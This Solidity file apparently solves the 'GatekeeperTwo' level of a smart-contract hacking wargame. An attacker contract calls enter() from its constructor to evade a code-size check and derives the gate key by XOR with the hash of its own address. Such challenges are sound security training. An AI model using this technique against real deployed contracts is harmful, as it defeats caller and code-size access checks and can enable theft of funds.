// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

/**
    @title Hacker contract fro GatekeeperTwo
    @notice To pass gateTwo, the attacking contract calls enter() in its constructor. The code is only assigned to a contract after the constructor is executed.
            To pass gateThree, we calculate the bytes8 of the XOR of the two equations. Since XORing an operand by the result will give the other operand.
*/

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGKTwo {
    
    constructor() public {
        GatekeeperTwo toHack = GatekeeperTwo(0x3Ad3dd65bB2Ea9636241958217857b12FD2d1Eb4);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        toHack.enter(gateKey);
    }
}